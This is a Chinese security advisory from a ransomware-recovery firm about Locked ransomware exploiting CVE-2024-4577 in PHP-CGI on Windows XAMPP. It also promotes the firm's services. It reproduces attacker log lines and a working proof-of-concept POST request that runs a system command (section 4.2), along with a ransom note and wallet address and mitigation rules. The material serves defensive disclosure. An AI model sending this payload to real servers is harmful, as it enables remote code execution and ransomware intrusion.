#  【紧急警示】Locked勒索病毒利用最新PHP远程代码执行漏洞大规模批量勒索！文末附详细加固方案   
原创 索勒安全团队  solar应急响应团队   2024-06-11 19:55  
  
## 1. Locked勒索病毒介绍  
  
locked勒索病毒属于TellYouThePass勒索病毒家族的变种，其家族最早于2019年3月出现，擅长利用高危漏洞被披露后的短时间内，利用1Day对暴露于网络上并存在有漏洞未修复的机器发起攻击。该家族在2023年下半年开始，频繁针对国内常见大型ERP系统的漏洞进行攻击，并且会利用钓鱼邮件针对财务人员个人主机进行钓鱼和入侵攻击。  
  
其曾经使用过的代表性漏洞有：“永恒之蓝”系列漏洞、Log4j2漏洞、某友NC漏洞、某蝶EAS漏洞、Apache ActiveMQ（CVE-2023-46604）等。  
  
  
2. 攻击说明  
  
本次locked勒索病毒通过XAMPP在PHP-CGI模式下远程代码执行漏洞(CVE-2024-4577)进行利用，该漏洞于2024年6月7日进行公开，虽然PHP已在8.3.8、8.2.20和8.1.29版本中发布了修复，但是披露该漏洞的台湾戴夫寇尔公司（DEVCORE）研究团队也做了说明，默认情况下，Windows 上所有版本的 XAMPP 安装都容易受到攻击，建议放弃PHP CGI，选择更安全的解决方案。  
## 2.1 PHP简介  
  
PHP是一门通用开源脚本语言，其语法借鉴吸收C、Java和Perl等流行计算机语言的特点，因此利于学习，使用广泛，主要适用于Web开发领域。  
## 2.1.1 XAMPP简介  
  
XAMPP是最流行的PHP开发环境，XAMPP是完全免费且易于安装的Apache发行版，其中包含MariaDB、PHP和Perl。XAMPP开放源码包的设置让安装和使用出奇容易，它以其广泛的应用范围在本地开发和测试领域备受赞誉。  
  
官网地址：https://www.apachefriends.org/zh_cn/index.html  
## 2.2 真实攻击案例  
  
根据从客户现场提取的apache日志对其进行分析，access.log中可以排查到被加密服务器存在攻击日志，该勒索团伙使用了2024.6.7日公开的CVE-2024-4577，20秒内仅通过两个POST请求完成攻击并执行加密。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DxUXemrrntp8f7mIB5vbhMOHW4ajCmYmu5R9EfFzjIcAb4GU8M53TGRYNS0Wmtknu6HUiaPzth0ISO6WsXyaCXA/640?wx_fmt=jpeg&from=appmsg "")  
```
88.218.76.13 - - [08/Jun/2024:05:54:06 +0800] "POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3d0+%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input HTTP/1.1" 200 145 "-" "Mozilla/5.0 (Linux; Android 8.1.0; TECNO KA7O Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36"
88.218.76.13 - - [08/Jun/2024:05:54:20 +0800] "POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3d0+%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input HTTP/1.1" 200 145 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us; Silk/1.0.13.81_10003810) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16 Silk-Accelerated=true"

```  
  
溯源该IP：88.218.76.13 近期被标记恶意攻击行为，并且通过该服务器投递加密器d3.hta，加密器详情分析可见公众号历史投稿[011.【病毒分析】locked勒索病毒分析](http://mp.weixin.qq.com/s?__biz=MzkyOTQ0MjE1NQ==&mid=2247485418&idx=1&sn=528ff6357d48960b4396f37cdb2aba76&chksm=c20837eef57fbef83d04937337c35aaa501ebf4154e96dc1318ed70017e0316be4f2405fdf16&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DxUXemrrntp8f7mIB5vbhMOHW4ajCmYmzUuMb2FjOo5FtWibcLaibib4atq8DvT1HnFY4L81eUOeEcJ83W6bQRLLw/640?wx_fmt=png&from=appmsg "")  
  
以下为加密器执行流程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DxUXemrrntp8f7mIB5vbhMOHW4ajCmYm1PhGoq39tEaAdsOfeTZuDeibtpia6eJ6M6K4YZAaz2SjLUvvN3XPuvqg/640?wx_fmt=png&from=appmsg "")  
## 2.3 加密样式  
##   
  
加密后****  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DxUXemrrntp8f7mIB5vbhMOHW4ajCmYmy5ibiaSSgeFkj5ibvuOlqtbOXjogLZr8mtTfQticcaFaVj9nGbkZa3EGZw/640?wx_fmt=png&from=appmsg "")  
  
黑客加密完后，除了添加拓展名，还会留下“READ_ME9.html”命名的勒索信  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DxUXemrrntp8f7mIB5vbhMOHW4ajCmYmBTCoaibTiazhibrb4AlRqjvs7OqD9b0tcIAuqg9TSJiayUOGX2K1EIKkCg/640?wx_fmt=png&from=appmsg "")  
## 2.4 勒索内容  
##   
```
send 0.1btc to my address:bc1qnuxx83nd4keeegrumtnu8kup8g02yzgff6z53l. contact email:service@cyberkiller.xyz,if you can't contact my email, please contact some data recovery company(suggest taobao.com), may they can contact to me .your id: 

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DxUXemrrntp8f7mIB5vbhMOHW4ajCmYmgicStkIWzusktaJBxia9h87VRpjW7SKFsVcX6calKBKzpITdalubThkw/640?wx_fmt=png&from=appmsg "")  
  
勒索信表示，若想恢复数据，需要将0.1比特币打入黑客的比特币钱包地址，并且提供了自己的电子邮箱。  
  
按照本文撰写时的实时汇率计算，该勒索金额折合人民币约为4.9万元。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DxUXemrrntp8f7mIB5vbhMOHW4ajCmYmeCTiaN7b6u6k9ormFkrJB7hKm43afmnY002adA05If0ib600ibjPXQKibQ/640?wx_fmt=png&from=appmsg "")  
  
  
<table><thead><tr><th style="line-height: 1.5em;letter-spacing: 0em;text-align: justify;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">比特币钱包地址</th><th style="line-height: 1.5em;letter-spacing: 0em;text-align: justify;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">bc1qnuxx83nd4keeegrumtnu8kup8g02yzgff6z53l</th></tr></thead><tbody style="line-height: 1.5em;letter-spacing: 0em;border-width: 0px;border-style: initial;border-color: initial;"><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;text-align: justify;">电子邮箱</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;text-align: justify;">service@helloworldtom.online</td></tr></tbody></table>  
  
通过黑客留下的比特币钱包地址，我们发现和之前遇到的案例中留下的比特币钱包地址一致，并且得出结论该黑客的攻击手法多样，3月份利用钓鱼邮件形式结合勒索病毒进行大规模攻击，其针对对象为财务人员，而本次则利用高危漏洞被披露后，使用1Day进行大规模攻击，攻击对象为未修复该漏洞的服务器。  
  
详情可见：[001.【紧急警示】Loked勒索病毒针对财务人员的钓鱼及勒索攻击激增！企业财务电脑及系统资产遭勒索加密，风险不容忽视！](http://mp.weixin.qq.com/s?__biz=MzkyOTQ0MjE1NQ==&mid=2247485258&idx=1&sn=2b3911891c8cf34e6dc895bafc78ff0a&chksm=c208374ef57fbe58fabd5872797eec167e4b2f978640d677df7c76f369317aae0a47ef031f29&scene=21#wechat_redirect)  
  
## 3. 漏洞详情  
## 3.1 漏洞概述  
  
台湾戴夫寇尔公司（DEVCORE）研究团队在进行前瞻攻击研究期间，发现这个PHP编程语言存在远程代码执行漏洞，基于PHP在网站生态使用的广泛性以及此漏洞之易重现性，研究团队将此漏洞标记为严重、并在第一时间回报给PHP官方。PHP官方已在2024/06/06 发布修复版本，详细时程可参阅6.漏洞报告时间轴。  
  
当PHP运行在Window平台且使用了如繁体中文(代码页950)、简体中文(代码页936)和日语(代码页932)等语系时，未经授权的攻击者可以直接在远程服务器上执行任意代码，对于在英语、韩语和西欧等其他区域设置中运行的 Windows，由于 PHP 使用场景的广泛性，目前无法完全枚举和消除所有潜在的利用场景。因此，建议用户进行全面的资产评估，验证其使用场景，并将PHP更新到最新版本，以确保安全性。  
  
<table><thead><tr><th style="line-height: 1.5em;letter-spacing: 0em;text-align: justify;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;"><strong style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgba(0, 0, 0, 0);width: auto;height: auto;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;">漏洞编号</strong></th><th style="line-height: 1.5em;letter-spacing: 0em;text-align: justify;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">CVE-2024-4577</th><th style="line-height: 1.5em;letter-spacing: 0em;text-align: justify;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;"><strong style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgba(0, 0, 0, 0);width: auto;height: auto;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;">公开时间</strong></th><th style="line-height: 1.5em;letter-spacing: 0em;text-align: justify;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);width: auto;height: auto;border-top-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;min-width: 85px;">2024-6-7</th></tr></thead><tbody style="line-height: 1.5em;letter-spacing: 0em;border-width: 0px;border-style: initial;border-color: initial;"><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(255, 255, 255);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;text-align: justify;"><strong style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgba(0, 0, 0, 0);width: auto;height: auto;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;">漏洞类型</strong></td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;text-align: justify;">远程代码执行</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;text-align: justify;"><strong style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgba(0, 0, 0, 0);width: auto;height: auto;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;">漏洞评级</strong></td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;text-align: justify;">高危</td></tr><tr style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(248, 248, 248);width: auto;height: auto;"><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;text-align: justify;"><strong style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgba(0, 0, 0, 0);width: auto;height: auto;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;">利用方式</strong></td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;text-align: justify;">远程</td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;text-align: justify;"><strong style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgba(0, 0, 0, 0);width: auto;height: auto;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;">公开<strong style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgba(0, 0, 0, 0);width: auto;height: auto;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;"><strong style="background: none 0% 0% / auto no-repeat scroll padding-box border-box rgba(0, 0, 0, 0);width: auto;height: auto;border-style: none;border-width: 3px;border-color: rgba(0, 0, 0, 0.4);border-radius: 0px;">PoC</strong></strong>/EXP</strong></td><td style="min-width: 85px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;text-align: justify;">公开</td></tr></tbody></table>  
## 3.2 影响范围  
- PHP 8.3 < 8.3.8  
  
- PHP 8.2 < 8.2.20  
  
- PHP 8.1 < 8.1.29  
  
PHP Windows版 影响版本理论上包括 8.0.x 和 7.x 和 5.x  
- XAMPP Windows版 影响版本 <= 8.2.12  
  
- XAMPP Windows版 影响版本 <= 8.1.25  
  
- XAMPP Windows版 影响版本 <= 8.0.30  
  
由于PHP 8.0分支、PHP7以及PHP 5官方已不再维护，网站管理员可参考5.防护措施，并于修补建议找到暂时缓解措施。  
## 3.3 漏洞利用条件  
- 用户认证：无需用户认证  
  
- 前置条件：默认配置  
  
- 触发方式：远程  
  
## 4. 漏洞复现  
## 4.1 复现环境  
  
xampp 8.2.12  
## 4.2 复现详情  
##   
```
POST /php-cgi/php-cgi.exe?%add+cgi.force_redirect%3dXCANWIN+%add+allow_url_include%3don+%add+auto_prepend_file%3dphp%3a//input HTTP/1.1
Host: 192.168.0.136
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: closeUpgrade-Insecure-Requests: 1If-Modified-Since: Sun, 19 Nov 2023 11:10:25 GMTIf-None-Match: "1443-60a7f6a8cca40"Content-Type: application/x-www-form-urlencodedContent-Length: 32 <?php echo system("whoami");?>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DxUXemrrntp8f7mIB5vbhMOHW4ajCmYmHeic0ScuIp3yx5I43GU4pDyONzNeqyt2HczDUoqMFbRiaBBnicPE06lpA/640?wx_fmt=jpeg&from=appmsg "")  
## 5. 防护措施  
## 5.1 官方修复方案  
##   
  
强烈建议所有使用者升级至PHP官方最新版本8.3.8、8.2.20与8.1.29，对于无法升级的系统可通过下列方式暂时缓解漏洞。  
  
除此之外，由于PHP CGI已是一种过时且易于出现问题的架构，也建议评估迁移至较为安全的Mod-PHP、FastCGI或是PHP-FPM等架构可能性。  
  
官网地址：****https://www.php.net/  
  
更新地址：https://github.com/php/php-src/tags  
## 5.2 缓解漏洞方法  
## 5.2.1. 对于无法升级PHP的用户  
  
以下重写规则可用于阻止攻击。请注意，这些规则只是针对繁体中文、简体中文和日语区域设置的临时缓解措施。在实践中，仍建议更新到修补版本或迁移体系结构。  
```
RewriteEngine On
RewriteCond %{QUERY_STRING} ^%ad [NC]
RewriteRule .? - [F,L]

```  
## 5.2.2. 对于使用XAAMPP foe Windows的用户  
  
在撰写本文时，XAMPP 尚未发布此漏洞的相应更新文件。如果确认不需要 PHP CGI 功能，则可以通过修改以下 Apache HTTP Server 配置来避免暴露于此漏洞：  
>   
> C:/xampp/apache/conf/httpd.conf  
  
  
定位相应的行：  
```
LoadModule cgi_module modules/mod_cgi.so

```  
  
并注释掉它:  
```
# LoadModule cgi_module modules/mod_cgi.so

```  
>   
> C:/xampp/apache/conf/extra/httpd-xampp.conf****  
  
  
定位相应的行：  
```
ScriptAlias /php-cgi/ "C:/xampp/php/"

```  
  
并注释掉它:  
```
# ScriptAlias /php-cgi/ "C:/xampp/php/"

```  
  
修复后****  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DxUXemrrntp8f7mIB5vbhMOHW4ajCmYmwsxscn6qq65VqyJJrWe9ZMcDOxbE6bPKu49PMiaY4v8hoHd91al2njQ/640?wx_fmt=jpeg&from=appmsg "")  
# 6. 漏洞报告时间轴  
- 2024/05/07 - DEVCORE通过PHP官方漏洞披露页面报告了该问题。  
  
- 2024/05/07 - PHP 开发人员确认了该漏洞，并强调需要及时修复。  
  
- 2024/05/16 - PHP 开发人员发布了修复程序的第一个版本并征求反馈。  
  
- 2024/05/18 - PHP 开发人员发布了修复程序的第二个版本并征求反馈。  
  
- 2024/05/20 - PHP 进入新版本发布的准备阶段。  
  
- 2024/06/06 - PHP 发布了 8.3.8、8.2.20 和 8.1.29 的新版本。  
  
  
7.  
安全建议  
  
##   
## 7.1 风险消减措施  
  
**资产梳理排查目标:**根据实际情况，对内外网资产进行分时期排查  
  
**服务方式:**调研访谈、现场勘查、工具扫描  
  
**服务关键内容：**流量威胁监测系统排查、互联网暴露面扫描服务、技术加固服务、集权系统排查  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DxUXemrrntqVHm3NJFwa3sXj6s3zc5m5bclZq1UoKxM51XPoGtwWLxNhicCvDc7sia1ny5kLibeD7QsTDOhA3AJXA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
## 7.2 安全设备调优  
##   
  
**目标**  
  
通过对安全现状的梳理和分析，识别安全策略上的不足，结合目标防御、权限最小化、缩小攻击面等一系列参考原则，对设备的相关配置策略进行改进调优，一方面，减低无效或低效规则的出现频次；另一方面，对缺失或遗漏的规则进行补充，实现将安全设备防护能力最优化。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DxUXemrrntqVHm3NJFwa3sXj6s3zc5m52HeMa7qo5p2D6BASboMuW7foHV5SNS6o58lED1y8FKENvq7ZDetzMA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**主要目标设备**  
  
网络安全防护设备、系统防护软件、日志审计与分析设备、安全监测与入侵识别设备。  
## 7.3 全员安全意识增强调优  
  
**目标：**  
  
通过网络安全意识宣贯、培训提升全方位安全能力  
  
**形式：**  
  
培训及宣贯  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DxUXemrrntqVHm3NJFwa3sXj6s3zc5m5pfymWaXkx2LtF36ib1dq3c87Vrz46BjMYWNibLs3hDibxSY4uHicNwK10w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
线下培训课表  
  
若无法组织线下的集体培训，考虑两种方式:  
  
1.提供相关的安全意识培训材料，由上而下分发学习  
  
2.组织相关人员线上开会学习。线上培训模式。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DxUXemrrntqVHm3NJFwa3sXj6s3zc5m5J2ZYClaFMMicg19DfdgwaxB8KNuMCsnrVxlAZ6ibZnpysBicfBPxMiaPHg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
线上学习平台  
  
8  
.  
团队介绍  
  
  
solar团队数年深耕勒索解密与数据恢复领域，在勒索解密和数据恢复领域建立了良好的声誉，以高效、安全、可靠的解决方案赢得了客户的信任。无论是个人用户还是大型企业，都能提供量身定制的服务，确保每一个被勒索软件侵害的数据都能够恢复到最佳状态，同时在解密数据恢复后，提供全面的后门排查及安全加固服务，杜绝二次感染的风险。同时，solar团队坚持自主研发及创新，在攻防演练平台、网络安全竞赛平台、网络安全学习平台方面加大研发投入，目前已获得十几项专利及知识产权。团队也先后通过了ISO9001质量管理体系、ISO14000环境管理体系、ISO45001职业安全健康管理体系 、ITSS（信息技术服务运行维护标准四级）以及国家信息安全漏洞库(CNNVD)技术支撑单位等认证，已构建了网络安全行业合格的资质体系。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DxUXemrrntqwAoibf94VSu6ialDjxxUOdJR9eTyhVjXENOYnDtw59EmicKcamQB24l2lfS40BvUepdibmLZk6jDpRQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DxUXemrrntqwAoibf94VSu6ialDjxxUOdJjOk3X8Piboicx0ly5sh0ObFSmxfC7zuicfibejpiajyYbg72P8V0KvKP30Q/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DxUXemrrntqwAoibf94VSu6ialDjxxUOdJlh4Vf0ngWOZYMtoFN3mTXgDqOq3ic8pJOWCMQrGB6mo52wDuExibLzzQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DxUXemrrntqwAoibf94VSu6ialDjxxUOdJhpNa6uJciaKCNaQ05tFRv2IfQBFNt7pCEFmDs6fMibzPoY1fTj5nffcQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DxUXemrrntqwAoibf94VSu6ialDjxxUOdJzyWYktD1APzAZfEWiatNSOPqQfsCtTG6zC6qeFgoqY25HlrichBKzudQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DxUXemrrntqwAoibf94VSu6ialDjxxUOdJjG4J9new0tV0jp3bZmEGvsXtlTKIbib0kCBVhhDibov0Vcoiab3TlJXew/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DxUXemrrntqwAoibf94VSu6ialDjxxUOdJzFsjg6iadmavBB68yKfEVtvrws5NLN4QLpO61O1fpsybUovp5KxT1vQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/DxUXemrrntqwAoibf94VSu6ialDjxxUOdJOguWKiabsPUl8kLlc34QSNsqfraJDQsWM2E8OywPDWDQ1xFpIqPKcMA/640?wx_fmt=jpeg&from=appmsg "")  
  
More  
  
  
# 9.我们的数据恢复服务流程  
  
**多年的数据恢复处理经验，在不断对客户服务优化的过程中搭建了"免费售前+安心保障+专业恢复+安全防御"一体化的专业服务流程。**  
  
**① 免费咨询/数据诊断分析**  
  
       专业的售前技术顾问服务，免费在线咨询，可第一时间获取数据中毒后的正确处理措施，防范勒索病毒在内网进一步扩散或二次执行，避免错误操作导致数据无法恢复。  
  
       售前技术顾问沟通了解客户的机器中毒相关信息，结合团队数据恢复案例库的相同案例进行分析评估，初步诊断分析中毒数据的加密/损坏情况。  
  
**② 评估报价/数据恢复方案**  
  
       您获取售前顾问的初步诊断评估信息后，若同意进行进一步深入的数据恢复诊断，我们将立即安排专业病毒分析工程师及数据恢复工程师进行病毒逆向分析及数据恢复检测分析。  
  
       专业数据恢复工程师根据数据检测分析结果，定制数据恢复方案（恢复价格/恢复率/恢复工期），并为您解答数据恢复方案的相关疑问。  
  
**③ 确认下单/签订合同**  
  
       您清楚了解数据恢复方案后，您可自主选择以下下单方式：  
  
双方签署对公合同：根据中毒数据分析情况，量身定制输出数据恢复合同，合同内明确客户的数据恢复内容、数据恢复率、恢复工期及双方权责条款，双方合同签订，正式进入数据恢复专业施工阶段，数据恢复后进行验证确认，数据验证无误，交易完成。  
  
**④ 开始数据恢复专业施工**  
  
      安排专业数据恢复工程师团队全程服务，告知客户数据恢复过程注意事项及相关方案措施，并可根据客户需求及数据情况，可选择上门恢复/远程恢复。  
  
      数据恢复过程中，团队随时向您报告数据恢复每一个节点工作进展（数据扫描 → 数据检测 → 数据确认 → 恢复工具定制 → 执行数据恢复 → 数据完整性确认）。  
  
**⑤ 数据验收/安全防御方案**  
  
      完成数据恢复后，我司将安排数据分析工程师进行二次检查确认数据恢复完整性，充分保障客户的数据恢复权益，二次检测确认后，通知客户进行数据验证。  
  
      客户对数据进行数据验证完成后，我司将指导后续相关注意事项及安全防范措施，并可提供专业的企业安全防范建设方案及安全顾问服务，抵御勒索病毒再次入侵。  
  
  
**点击关注下方名片****进入公众号 了解更多**  
  
  
****  
**更多资讯 扫码加入群组交流**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/DxUXemrrntqvGicoPibE3icWlZxFWfcfQiauJPibdeibc1GawHM7zk1hEibg5BnEKlLq5uKlOyO2qFwhDJzDhvMgia2gXg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
喜欢此内容的人还喜欢  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzkyOTQ0MjE1NQ==&mid=2247485026&idx=1&sn=da448cf74f07557f51a40a5b40f1d018&chksm=c2083666f57fbf70d0687b806bd7e95e6ca4d8b2a5f21d215c83a59e5e1d1085c4d5a8e63046&scene=21#wechat_redirect)  
[【成功案例】某集团公司的Phobos最新变种勒索病毒2700解密恢复项目](http://mp.weixin.qq.com/s?__biz=MzkyOTQ0MjE1NQ==&mid=2247485026&idx=1&sn=da448cf74f07557f51a40a5b40f1d018&chksm=c2083666f57fbf70d0687b806bd7e95e6ca4d8b2a5f21d215c83a59e5e1d1085c4d5a8e63046&scene=21#wechat_redirect)  
  
  
索勒安全团队  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzkyOTQ0MjE1NQ==&mid=2247483909&idx=1&sn=aa9ab5983e66dc5507f348036533727d&chksm=c2083201f57fbb170fa35ef1d0948282d87ed2cff06449f21f0d6cbe5ceb66074e248413f8e1&scene=21#wechat_redirect)  
[【紧急警示】Locked勒索病毒针对财务人员的钓鱼及勒索攻击激增！企业财务电脑及系统资产遭勒索加密，风险不容忽视！](http://mp.weixin.qq.com/s?__biz=MzkyOTQ0MjE1NQ==&mid=2247485258&idx=1&sn=2b3911891c8cf34e6dc895bafc78ff0a&chksm=c208374ef57fbe58fabd5872797eec167e4b2f978640d677df7c76f369317aae0a47ef031f29&scene=21#wechat_redirect)  
[](http://mp.weixin.qq.com/s?__biz=MzkyOTQ0MjE1NQ==&mid=2247483909&idx=1&sn=aa9ab5983e66dc5507f348036533727d&chksm=c2083201f57fbb170fa35ef1d0948282d87ed2cff06449f21f0d6cbe5ceb66074e248413f8e1&scene=21#wechat_redirect)  
  
  
索勒安全团队  
# 【病毒分析】mallox家族malloxx变种加密器分析报告  
  
#   
  
索勒安全团队  
  
